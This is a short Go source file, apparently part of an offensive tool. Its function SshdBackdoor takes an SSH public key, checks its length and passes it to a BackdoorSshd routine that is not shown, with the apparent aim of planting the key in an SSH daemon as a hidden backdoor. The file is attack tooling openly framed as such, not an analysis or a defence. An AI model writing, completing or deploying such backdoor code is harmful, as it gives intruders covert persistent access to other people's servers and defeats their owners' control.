// go:build 386 || amd64

package sshd

import (
	"fmt"
)

func SshdBackdoor(pubkey string) error {
	fmt.Println("Your ssh public key is :" + pubkey)
	if len(pubkey) > 450 {
		return fmt.Errorf("key too long")
	}
	if err := BackdoorSshd(pubkey); err != nil {
		fmt.Println(err)
		return err
	}
	return nil
}
